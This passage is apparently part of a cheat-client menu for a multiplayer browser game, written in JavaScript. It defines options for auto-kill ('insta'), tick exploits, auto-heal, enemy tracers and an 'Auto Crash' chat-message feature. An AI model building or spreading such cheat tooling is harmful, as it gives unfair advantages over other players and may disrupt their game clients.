          if (window._chromaRestarters && window._chromaRestarters[key]) {
            window._chromaRestarters[key]();
          }
        });
      } else {
        // Turning OFF party mode
        // First stop ALL chroma timers
        colorKeys.forEach((key) => {
          if (window._chromaStoppers && window._chromaStoppers[key]) {
            window._chromaStoppers[key]();
          }
        });

        // Restore original color values and disable ALL chroma
        colorKeys.forEach((key) => {
          // Restore original color value
          if (
            this._partyModeOriginalColors &&
            this._partyModeOriginalColors[key] !== undefined
          ) {
            this[key] = this._partyModeOriginalColors[key];
          }
          // Disable ALL chroma regardless of previous state
          this[key + "Chroma"] = false;
        });

        this._partyModeActive = false;
        this._partyModeOriginalChroma = null;
        this._partyModeOriginalColors = null;
        AB.NotiDisplay.add("Party Mode OFF", "#ff4d4d", 0);
      }

      this.saveSettings(true);

      const partyModeBtn = this.menu.querySelector("#partyModeToggle");
      if (partyModeBtn) {
        if (this._partyModeActive) {
          partyModeBtn.style.background =
            "linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3)";
          partyModeBtn.style.backgroundSize = "200% 100%";
          partyModeBtn.style.animation = "partyGradient 2s linear infinite";
          partyModeBtn.querySelector(".z-option-title").textContent =
            "Party Mode (ON)";
        } else {
          partyModeBtn.style.background = "";
          partyModeBtn.style.animation = "";
          partyModeBtn.querySelector(".z-option-title").textContent =
            "Party Mode";
        }
      }
    },

    getColorOptionKeys() {
      const keys = [];
      const flatten = (opts) =>
        opts.reduce(
          (a, b) => [...a, b, ...(b.suboptions ? flatten(b.suboptions) : [])],
          [],
        );
      const allOpts = flatten(this.Render || []);
      allOpts.forEach((o) => {
        if (o.type === "Colors" && o.onChange?.[0]?.[0]) {
          keys.push(o.onChange[0][0]);
        }
      });
      return keys;
    },

    resetRenderDefaults() {
      const clone = (v) =>
        Array.isArray(v)
          ? v.slice()
          : v && typeof v === "object"
            ? JSON.parse(JSON.stringify(v))
            : v;
      const flatten = (opts) =>
        opts.reduce(
          (a, b) => [...a, b, ...(b.suboptions ? flatten(b.suboptions) : [])],
          [],
        );
      const renderOpts = flatten(this.Render || []);
      this.withSilent(() => {
        renderOpts.forEach((o) => {
          if (!o?.onChange?.[0]) return;
          const cfg = Array.isArray(o.onChange[0])
            ? o.onChange[0]
            : [o.onChange[0]];
          const idKey = cfg[0];
          if (!idKey || this._defaults?.[idKey] === undefined) return;
          this[idKey] = clone(this._defaults[idKey]);
        });
        this.syncUI(true);
        this.saveSettings(true);
      });
      AB.NotiDisplay.add("Render defaults restored", "#9B5CFF", 0);
    },
    //Header   - { type:"Header", title:"SECTION TITLE" },
    //text     - { type:"text", id:"ElementID", title:"Example", description:`Example`, icon:"info", onChange: [["ActualValue", DefaultValue], [Notification, console.log]] }, (note: if you omit onChange, it becomes just a static row)
    //Checkbox - { type:"checkbox", id:"ElementID", title:"Example", description:`Example`, icon:"check_box", onChange: [["ActualValue", Checked{true/false}], [Notification, console.log]] },
    //Slider   - { type:"slider", id:"ElementID", title:"Example", description:`Example`, icon:"tune", onChange: [["ActualValue", DefaultValue, [MinValue, MaxValue], Step], [Notification, console.log]] },
    //Input    - { type:"Input", id:"ElementID", title:"Example", description:`Example`, icon:"keyboard", onChange: [["ActualValue", DefaultValue, { kind:"text"|"number"|"key", placeholder?, maxLen?, live?, min?, max?, step? }], [Notification, console.log]] }, kind:"text"/"number"/"key"
    //Selector - { type:"selector", id:"ElementID", title:"Example", description:`Example`, icon:"list", onChange: [["ActualValue", DefaultValue, [Value1, Value2, ...]], [Notification, console.log]] },
    //Colors   - { type:"Colors", id:"ElementID", title:"Example", description:`Example`, icon:"palette", onChange: [["ActualValue", [DefaultHex, FixedMode{true/false}], [AllowChroma{true/false}, StartChroma{true/false}, ChromaSpeedMs]], [Notification, console.log]] },
    //Loadout  - { type:"Loadout", id:"ElementID", title:"Example", description:`Example`, icon:"checkroom", onChange: [["ActualValue", DefaultId, "hat"|"acc"|"pri"|"sec"], [Notification, console.log]] },
    //SelecBox - { type:"SelecBox", id:"ElementID", title:"Example", description:`Example`, icon:"toggle_on", onChange: [[DefaultSelectedName, ["Name1", DefaultBool], ["Name2", DefaultBool], ["Name3", DefaultBool], ...], [Notification, console.log]] },
    //Graph    - { type:"Graph", id:"ElementID", title:"Example", description:`Example`, icon:"show_chart", onChange: [["GraphKey", DefaultValueIgnored, SampleSource], [Notification, console.log]] }, (note: SampleSource can be: () => number, "globalVarName", or a number)
    //Stat     - { type:"Stat", id:"ElementID", title:"Example", description:`Example`, icon:"insights", onChange: [["TotalKeyOrLabel", getFn?, { mode?, fmt?, totalKey?, max?, hideTotal?, bar? }]] },
    //          getFn: () => number (current value)
    //          totalKey: string for total storage key (defaults to label/id)
    //          max: number enables default progress bar scaling
    //          bar: (v)=>percent custom bar function
    //          fmt: (v)=>string custom display for current value

    // suboptions: [ { ...same option objects... }, ... ]

    //to use it, u can Ab.Menu. (Check the ActualValue) (If it Selector, go with Ab.Menu.instatype == "Smart" or Ab.Menu.Instatype

    Main: [
      { type: "Header", title: "PLAYER STATS" },
      {
        type: "Graph",
        id: "PingGraph",
        title: "Ping (ms)",
        icon: "network_ping",
        onChange: [
          ["PingGraph", 0, () => window.pingTime],
          [true, false],
        ],
      },
      {
        type: "Graph",
        id: "FpsGraph",
        title: "FPS",
        icon: "speed",
        onChange: [
          ["FpsGraph", 1, "fps"],
          [true, false],
        ],
      },
      {
        type: "Stat",
        id: "PlaytimeStat",
        title: "Playtime",
        icon: "schedule",
        onChange: [["playtime", { mode: "playtime" }]],
      },
      {
        type: "Stat",
        id: "DeathsStat",
        title: "Deaths",
        icon: "warning",
        onChange: [["Deaths", () => window.deaths, { max: 1000 }]],
      },
      {
        type: "Stat",
        id: "KillsStat",
        title: "Kills",
        icon: "emoji_events",
        onChange: [["Kills", () => window.kills, { max: 1000 }]],
      },
      {
        type: "Graph",
        id: "PacketGraph",
        title: "Packet",
        description: "Frames per second",
        icon: "speed",
        onChange: [
          ["PacketGraph", 0, () => window.secPacket],
          [true, false],
        ],
      },
    ],

    Setting: [
      { type: "Header", title: "COMBAT" },

      {
        type: "text",
        id: "InstaMenu",
        title: "Insta",
        description: "Insta kill feature",
        icon: "flash_on",
        onChange: [
          ["InstaMenu", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "Input",
            id: "InstaKey",
            title: "Insta Key",
            description: "Key binding",
            icon: "keyboard",
            onChange: [
              ["InstaKey", "r", { kind: "key" }],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "InstaSpeed",
            title: "Insta Speed",
            description: "Speed of insta",
            icon: "speed",
            onChange: [
              ["InstaSpeed", 0, [0, 300], 1],
              [true, false],
            ],
          },
          {
            type: "selector",
            id: "instaType",
            title: "InstaKill Type",
            description: "Type of insta",
            icon: "bolt",
            onChange: [
              ["instaType", "oneShot", ["oneShot", "spammer", "oneframe"]],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "AutoInsta",
            title: "AutoInsta",
            description: "Auto insta enemy",
            icon: "auto_awesome",
            onChange: [
              ["AutoInsta", false],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "backupNobull",
            title: "Backup Nobull Insta",
            description: "Nobull insta fallback",
            icon: "backup",
            onChange: [
              ["backupNobull", true],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "text",
        id: "TickMenu",
        title: "Tick",
        description: "All tick features except SpikeTick",
        icon: "replay",
        onChange: [
          ["TickMenu", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "VelTick",
            title: "Vel Tick",
            description: "Enable auto velocity tick",
            icon: "flash_on",
            onChange: [
              ["VelTick", false],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "counterTick",
            title: "Counter Tick",
            description: "Enable auto counter tick",
            icon: "flash_on",
            onChange: [
              ["counterTick", false],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "revTick",
            title: "Rev Tick",
            description: "Reverse tick timing",
            icon: "replay",
            onChange: [
              ["revTick", true],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "predictTick",
            title: "Predict Tick",
            description: "Tick prediction",
            icon: "psychology",
            onChange: [
              ["predictTick", true],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "anti1tick",
            title: "Anti 1 Tick",
            description: "Heal vs 1-tick threats",
            icon: "health_and_safety",
            onChange: [
              ["anti1tick", true],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "SpikeTick",
        title: "Spike Tick",
        description: "Auto kill with spike tick",
        icon: "dangerous",
        onChange: [
          ["SpikeTick", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "safeAntiSpikeTick",
            title: "Safe AntiSpikeTick",
            description: "Safe spike tick counter",
            icon: "security",
            onChange: [
              ["safeAntiSpikeTick", true],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "autoPush",
        title: "Auto Push",
        description: "Push enemies automatically",
        icon: "open_with",
        onChange: [
          ["autoPush", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "antipush",
            title: "Anti-Push",
            description: "Prevent enemy push",
            icon: "block",
            onChange: [
              ["antipush", true],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "AutoSpin",
        title: "Auto Spin",
        description: "Spin aim automatically",
        icon: "autorenew",
        onChange: [
          ["AutoSpin", false],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "selector",
            id: "AutoSpinDir",
            title: "Direction",
            description: "Spin direction",
            icon: "swap_horiz",
            onChange: [
              ["AutoSpinDir", "Right", ["Left", "Right"]],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "AutoSpinSpeed",
            title: "Speed",
            description: "Degrees per second",
            icon: "speed",
            onChange: [
              ["AutoSpinSpeed", 360, [30, 50000], 10],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "AutoPlace",
        title: "Auto Place",
        description: "Place buildings automatically",
        icon: "add_box",
        onChange: [
          ["AutoPlace", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "Input",
            id: "autoPlaceTick",
            title: "AutoPlacer Tick",
            description: "Placement tick interval",
            icon: "timer",
            onChange: [
              [
                "autoPlaceTick",
                1,
                { kind: "number", min: 1, max: 99, step: 1 },
              ],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "autoPlaceAccuracy",
            title: "Angle Accuracy",
            description: "Higher = more angle samples (slower)",
            icon: "tune",
            onChange: [
              ["autoPlaceAccuracy", 1, [1, 10], 0.5],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "AutoMill",
        title: "Auto Mill",
        description: "Place mills automatically",
        icon: "precision_manufacturing",
        onChange: [
          ["AutoMill", false],
          [true, false],
        ],
      },

      {
        type: "checkbox",
        id: "autoReplace",
        title: "Auto Replace",
        description: "Replace broken builds",
        icon: "autorenew",
        onChange: [
          ["autoReplace", true],
          [true, false],
        ],
      },

      {
        type: "checkbox",
        id: "safeWalk",
        title: "Safe Walk",
        description: "Avoid dangers while walking",
        icon: "directions_walk",
        onChange: [
          ["safeWalk", false],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "selector",
            id: "SafeWalkType",
            title: "Walk Type",
            description: "Type of Walk",
            icon: "upgrade",
            onChange: [
              ["SafeWalkType", "MoveAway", ["Stop", "MoveAway"]],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "selector",
        id: "antiBullType",
        title: "AntiBull Type",
        description: "Anti-bull behavior",
        icon: "shield",
        onChange: [
          ["antiBullType", "noab", ["noab", "abreload", "abalway"]],
          [true, false],
        ],
      },

      {
        type: "selector",
        id: "predictType",
        title: "Predict Movement",
        description: "Movement prediction render",
        icon: "timeline",
        onChange: [
          ["predictType", "disableRender", ["disableRender", "pre2", "pre3"]],
          [true, false],
        ],
      },

      { type: "Header", title: "MISC" },

      {
        type: "checkbox",
        id: "autoHeal",
        title: "Auto Heal",
        description: "Heal automatically",
        icon: "healing",
        onChange: [
          ["autoHeal", true],
          [true, false],
        ],
        suboptions: [
          {
            type: "checkbox",
            id: "antiInsta",
            title: "Anti Insta",
            description: "Counter insta kills",
            icon: "shield",
            onChange: [
              ["antiInsta", true],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "autoUpgrade",
        title: "Auto Upgrade",
        description: "Upgrade automatically",
        icon: "upgrade",
        onChange: [
          ["autoUpgrade", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "selector",
            id: "UpgType",
            title: "AutoUpgrade Type",
            description: "Upgrade path",
            icon: "upgrade",
            onChange: [
              [
                "UpgType",
                "KH",
                ["KH", "PH", "DH", "BH", "SH", "SM", "PM", "DM", "PB", "PBC"],
              ],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "AutoBreak",
        title: "Auto Break",
        description: "Break automatically",
        icon: "construction",
        onChange: [
          ["AutoBreak", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "BreakSpikeIntrap",
            title: "Break Spike Intrap",
            description:
              "Automactially Break Spike first if near weapon range.",
            onChange: [
              ["BreakSpikeIntrap", true],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "antiTrap",
            title: "Anti Trap",
            description: "Counter traps",
            icon: "warning",
            onChange: [
              ["antiTrap", true],
              [true, false],
            ],
          },
          {
            type: "SelecBox",
            id: "BreakObject",
            title: "Break Object",
            description: "",
            icon: "tune",
            onChange: [
              [
                "Spike",
                ["Trap", false],
                ["Windmill", false],
                ["Turret", false],
                ["Spike", true],
                ["Teleporter", false],
                ["Blocker", false],
                ["Wall", false],
              ],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "weaponGrind",
        title: "Auto-Grinder",
        description: "Weapon grinding mode",
        icon: "construction",
        onChange: [
          ["weaponGrind", false],
          [true, false],
        ],
        suboptions: [
          {
            type: "selector",
            id: "grindTo",
            title: "Grind To",
            description: "Weapon variant to grind for",
            icon: "upgrade",
            onChange: [
              [
                "grindTo",
                "Ruby",
                ["Gold", "Diamond", "Ruby"],
              ],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "autoBuy",
        title: "Auto Buy",
        description: "Auto purchase items",
        icon: "shopping_cart",
        onChange: [
          ["autoBuy", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "autoBuyEquip",
            title: "Auto Buy Equipment",
            description:
              "Automatically purchase hats and accessories when needed",
            icon: "storefront",
            onChange: [
              ["autoBuyEquip", true],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "autoRespawn",
        title: "Auto Respawn",
        description: "Respawn automatically",
        icon: "restart_alt",
        onChange: [
          ["autoRespawn", true],
          [true, false],
        ],
      },

      {
        type: "text",
        id: "ChatMenu",
        title: "Chat",
        description: "All chat related features",
        icon: "chat",
        onChange: [
          ["ChatMenu", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "AutoCrash",
            title: "Auto Crash",
            description: "Auto send crash messages",
            icon: "chat_bubble",
            onChange: [
              ["AutoCrash", false],
              [true, false],
            ],
          },
          {
            type: "selector",
            id: "autoGGType",
            title: "AutoGG Type",
            description: "Kill message style",
            icon: "chat",
            onChange: [
              [
                "autoGGType",
                "disabled",
                [
                  "disabled",
                  "abyss",
                  "robotics",
                  "frozen",
                  "chicken",
                  "redDragon",
                  "zakat",
                  "projectCube",
                  "happyMod",
                  "minus",
                  "revelation",
                ],
              ],
              [true, false],
            ],
          },
        ],
      },

      {
        type: "checkbox",
        id: "AutoHat",
        title: "AutoHat",
        description: "Manage hats automatically",
        icon: "sync",
        onChange: [
          ["AutoHat", true],
          [true, false],
        ],
        suboptions: [
          {
            type: "checkbox",
            id: "hatCycle",
            title: "Hat Cycle",
            description: "Cycle hats automatically",
            icon: "sync",
            onChange: [
              ["hatCycle", false],
              [true, false],
            ],
          },
          {
            type: "text",
            id: "LoadoutStuff",
            title: "Loadout",
            description: "Loadout Hat/Acc for combat",
            icon: "checkroom",
            onChange: [
              ["LoadoutStuff", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Hat" },
              {
                type: "Loadout",
                id: "LoadoutHatLeft",
                title: "LeftClick",
                description: "Pick hat for Left click",
                icon: "checkroom",
                onChange: [
                  ["LoadoutHatLeft", 7, "hat"],
                  [true, false],
                ],
              },
              {
                type: "Loadout",
                id: "LoadoutHatRight",
                title: "RightClick",
                description: "Pick hat for Right click",
                icon: "checkroom",
                onChange: [
                  ["LoadoutHatRight", 40, "hat"],
                  [true, false],
                ],
              },
              { type: "Header", title: "Acc" },
              {
                type: "Loadout",
                id: "LoadoutAccLeft",
                title: "LeftClick",
                description: "Pick acc for Left click",
                icon: "checkroom",
                onChange: [
                  ["LoadoutAccLeft", 21, "acc"],
                  [true, false],
                ],
              },
              {
                type: "Loadout",
                id: "LoadoutAccRight",
                title: "RightClick",
                description: "Pick acc for Right click",
                icon: "checkroom",
                onChange: [
                  ["LoadoutAccRight", 19, "acc"],
                  [true, false],
                ],
              },
              // { type: "Header", title: "Others" },
              // {
              //   type: "Loadout",
              //   id: "LoadoutWeapPri",
              //   title: "Primary",
              //   description: "Pick PRIMARY weapon",
              //   icon: "checkroom",
              //   onChange: [
              //     ["LoadoutWeapPri", 4, "pri"],
              //     [true, false],
              //   ],
              // },
              // {
              //   type: "Loadout",
              //   id: "LoadoutWeapSec",
              //   title: "Secondary",
              //   description: "Pick SECONDARY weapon",
              //   icon: "checkroom",
              //   onChange: [
              //     ["LoadoutWeapSec", 10, "sec"],
              //     [true, false],
              //   ],
              // },
            ],
          },
        ],
      },

      {
        type: "Input",
        id: "breakRange",
        title: "Break Range",
        description: "Break objects range",
        icon: "straighten",
        onChange: [
          ["breakRange", 700, { kind: "number", min: 0, max: 9999, step: 1 }],
          [true, false],
        ],
      },
    ],
    Render: [
      {
        type: "button",
        id: "partyModeToggle",
        title: "Party Mode",
        description: "Toggle chroma rainbow effect on all colors",
        icon: "celebration",
      },
      { type: "Header", title: "PLAYER & ANIMAL" },
      {
        type: "checkbox",
        id: "HealthBar",
        title: "Health Bar",
        description: "Toggle health bars",
        icon: "favorite",
        onChange: [
          ["HealthBar", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "selector",
            id: "HealthBarStyle",
            title: "Health Bar Style",
            description: "Choose how health bars are displayed",
            icon: "bar_chart",
            onChange: [
              ["HealthBarStyle", "Bar", ["Bar", "Circle", "Actionbar", "Text"]],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "PlayerHealthBar",
            title: "Player HealthBar",
            description: "Show player health",
            icon: "person",
            onChange: [
              ["PlayerHealthBar", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "checkbox",
                id: "PlayerAnimatedHealthBar",
                title: "Animated HealthBar",
                description: "Animated health bars",
                icon: "animation",
                onChange: [
                  ["PlayerAnimatedHealthBar", true],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "PlayerHealthBarColor",
                title: "Player Color",
                description: "Player health bar color",
                icon: "palette",
                onChange: [
                  [
                    "PlayerHealthBarColor",
                    ["#8ecc51", false],
                    [true, false, 50],
                  ],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "TeamHealthBar",
            title: "Team HealthBar",
            description: "Show team health",
            icon: "group",
            onChange: [
              ["TeamHealthBar", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "checkbox",
                id: "TeamAnimatedHealthBar",
                title: "Animated HealthBar",
                description: "Animated health bars",
                icon: "animation",
                onChange: [
                  ["TeamAnimatedHealthBar", true],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "TeamHealthBarColor",
                title: "Team Color",
                description: "Team health bar color",
                icon: "palette",
                onChange: [
                  ["TeamHealthBarColor", ["#4fc3f7", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "EnemyHealthBar",
            title: "Enemy HealthBar",
            description: "Show enemy health",
            icon: "person_off",
            onChange: [
              ["EnemyHealthBar", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "checkbox",
                id: "EnemyAnimatedHealthBar",
                title: "Animated HealthBar",
                description: "Animated health bars",
                icon: "animation",
                onChange: [
                  ["EnemyAnimatedHealthBar", true],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "EnemyHealthBarColor",
                title: "Enemy Color",
                description: "Enemy health bar color",
                icon: "palette",
                onChange: [
                  [
                    "EnemyHealthBarColor",
                    ["#cc5151", false],
                    [true, false, 50],
                  ],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "AnimalHealthBar",
            title: "Animal HealthBar",
            description: "Show animal health",
            icon: "pets",
            onChange: [
              ["AnimalHealthBar", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "checkbox",
                id: "AnimalAnimatedHealthBar",
                title: "Animated HealthBar",
                description: "Animated health bars",
                icon: "animation",
                onChange: [
                  ["AnimalAnimatedHealthBar", true],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "AnimalHealthBarColor",
                title: "Animal Color",
                description: "Animal health bar color",
                icon: "palette",
                onChange: [
                  [
                    "AnimalHealthBarColor",
                    ["#ffca28", false],
                    [true, false, 50],
                  ],
                  [true, false],
                ],
              },
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "VelTickAssist",
        title: "VelTick Assist",
        description: "Show VelTick range circle on poisoned target",
        icon: "radio_button_unchecked",
        onChange: [
          ["VelTickAssist", true],
          [true, false],
        ],
      },
      {
        type: "checkbox",
        id: "showNames",
        title: "Names",
        description: "Show player and entity names",
        icon: "person_add",
        onChange: [
          ["showNames", true],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Customization" },
          {
            type: "checkbox",
            id: "showLeaderName",
            title: "Leader",
            description: "Show name with crown for leader",
            icon: "emoji_events",
            onChange: [
              ["showLeaderName", true],
              [true, false],
            ],
          },
          {
            type: "checkbox",
            id: "showSkullName",
            title: "Kill Skull",
            description: "Show skull next to name after kill",
            icon: "skull",
            onChange: [
              ["showSkullName", true],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "NameSize",
            title: "Name Size",
            description: "Size of the name text",
            icon: "format_size",
            onChange: [
              ["NameSize", 16, [8, 32], 1],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "NamePosX",
            title: "Position X",
            description: "Horizontal offset for names",
            icon: "arrow_left_right",
            onChange: [
              ["NamePosX", 0, [-20, 20], 1],
              [true, false],
            ],
          },
          {
            type: "slider",
            id: "NamePosY",
            title: "Position Y",
            description: "Vertical offset for names",
            icon: "arrow_up_down",
            onChange: [
              ["NamePosY", 2, [-40, 20], 1],
              [true, false],
            ],
          },

          {
            type: "checkbox",
            id: "PlayerNameToggle",
            title: "Player",
            description: "Show player names",
            icon: "person",
            onChange: [
              ["PlayerNameToggle", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "Colors",
                id: "PlayerNameColor",
                title: "Color",
                description: "Player name color",
                icon: "palette",
                onChange: [
                  ["PlayerNameColor", ["#8ecc51", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "EnemyNameToggle",
            title: "Enemy",
            description: "Show enemy names",
            icon: "person_off",
            onChange: [
              ["EnemyNameToggle", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "Colors",
                id: "EnemyNameColor",
                title: "Color",
                description: "Enemy name color",
                icon: "palette",
                onChange: [
                  ["EnemyNameColor", ["#cc5151", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "TeamNameToggle",
            title: "Team",
            description: "Show team names",
            icon: "group",
            onChange: [
              ["TeamNameToggle", true],
              [true, false],
            ],
            suboptions: [
              {
                type: "Colors",
                id: "TeamNameColor",
                title: "Color",
                description: "Team name color",
                icon: "palette",
                onChange: [
                  ["TeamNameColor", ["#345eeb", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "AnimalNameToggle",
            title: "Animals",
            description: "Show animal names",
            icon: "pets",
            onChange: [
              ["AnimalNameToggle", false],
              [true, false],
            ],
            suboptions: [
              {
                type: "Colors",
                id: "AnimalNameColor",
                title: "Color",
                description: "Animal name color",
                icon: "palette",
                onChange: [
                  ["AnimalNameColor", ["#ffca28", false], [true, false, 50]],
                  [true, false],
                ],
              },
            ],
          },
        ],
      },
      {
        type: "checkbox",
        id: "showTracers",
        title: "Tracers",
        description: "Show tracer lines/arrows to entities",
        icon: "track_changes",
        onChange: [
          ["showTracers", false],
          [true, false],
        ],
        suboptions: [
          { type: "Header", title: "Style" },
          {
            type: "selector",
            id: "TracerType",
            title: "Tracer Type",
            description: "Visual style of tracers",
            icon: "category",
            onChange: [
              [
                "TracerType",
                "Line",
                [
                  "Line",
                  "Arrow",
                  "Dashed",
                  "Glow",
                  "Pulse",
                  "Curved",
                  "Segmented",
                  "Gradient",
                  "Phantom",
                  "OffscreenArrow",
                ],
              ],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Type Settings" },
              {
                type: "slider",
                id: "TracerDashLength",
                title: "Dash Length",
                description: "Length of dashes (Dashed type)",
                icon: "space_bar",
                onChange: [
                  ["TracerDashLength", 10, [5, 30], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerDashGap",
                title: "Dash Gap",
                description: "Gap between dashes (Dashed type)",
                icon: "space_bar",
                onChange: [
                  ["TracerDashGap", 5, [2, 20], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerGlowBlur",
                title: "Glow Blur",
                description: "Blur amount (Glow type)",
                icon: "blur_on",
                onChange: [
                  ["TracerGlowBlur", 15, [5, 40], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerPulseSpeed",
                title: "Pulse Speed",
                description: "Pulse animation speed (Pulse type)",
                icon: "speed",
                onChange: [
                  ["TracerPulseSpeed", 200, [50, 500], 10],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerCurveAmount",
                title: "Curve Amount",
                description: "How much the line curves (Curved type)",
                icon: "trending_up",
                onChange: [
                  ["TracerCurveAmount", 20, [5, 50], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerSegmentCount",
                title: "Segment Count",
                description: "Number of segments (Segmented type)",
                icon: "view_week",
                onChange: [
                  ["TracerSegmentCount", 5, [3, 15], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerArrowDistance",
                title: "Arrow Distance",
                description: "Distance from player (OffscreenArrow type)",
                icon: "straighten",
                onChange: [
                  ["TracerArrowDistance", 150, [50, 300], 10],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerArrowSize",
                title: "Arrow Size",
                description: "Size of arrow (Arrow/OffscreenArrow type)",
                icon: "open_in_full",
                onChange: [
                  ["TracerArrowSize", 12, [6, 24], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerPhantomDistance",
                title: "Phantom Distance",
                description: "Base distance from player (Phantom type)",
                icon: "straighten",
                onChange: [
                  ["TracerPhantomDistance", 150, [80, 300], 10],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerPhantomSize",
                title: "Phantom Size",
                description: "Size of phantom player (Phantom type)",
                icon: "person",
                onChange: [
                  ["TracerPhantomSize", 25, [15, 50], 1],
                  [true, false],
                ],
              },
              {
                type: "slider",
                id: "TracerPhantomOpacity",
                title: "Phantom Opacity",
                description: "Transparency of phantom (Phantom type)",
                icon: "opacity",
                onChange: [
                  ["TracerPhantomOpacity", 50, [10, 100], 5],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "EnemyTracer",
            title: "Enemy",
            description: "Show tracers to enemies",
            icon: "person_off",
            onChange: [
              ["EnemyTracer", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Enemy Settings" },
              {
                type: "slider",
                id: "EnemyTracerThickness",
                title: "Thickness",
                description: "Line / arrow thickness",
                icon: "line_weight",
                onChange: [
                  ["EnemyTracerThickness", 3, [1, 10], 1],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "EnemyTracerColor",
                title: "Color",
                description: "Enemy tracer color",
                icon: "palette",
                onChange: [
                  ["EnemyTracerColor", ["#ff0000", false], [true, false, 50]],
                  [true, false],
                ],
              },
              {
                type: "checkbox",
                id: "EnemyNearLines",
                title: "Show Near Lines",
                description: "Additional lines to nearby enemies",
                icon: "linear_scale",
                onChange: [
                  ["EnemyNearLines", false],
                  [true, false],
                ],
              },
            ],
          },
          {
            type: "checkbox",
            id: "TeamTracer",
            title: "Team",
            description: "Show tracers to teammates",
            icon: "group",
            onChange: [
              ["TeamTracer", true],
              [true, false],
            ],
            suboptions: [
              { type: "Header", title: "Team Settings" },
              {
                type: "slider",
                id: "TeamTracerThickness",
                title: "Thickness",
                description: "Line / arrow thickness",
                icon: "line_weight",
                onChange: [
                  ["TeamTracerThickness", 3, [1, 10], 1],
                  [true, false],
                ],
              },
              {
                type: "Colors",
                id: "TeamTracerColor",
                title: "Color",
                description: "Team tracer color",
                icon: "palette",
                onChange: [
                  ["TeamTracerColor", ["#4fc3f7", false], [true, false, 50]],
                  [true, false],
                ],
              },
              {
                type: "checkbox",
                id: "TeamNearLines",
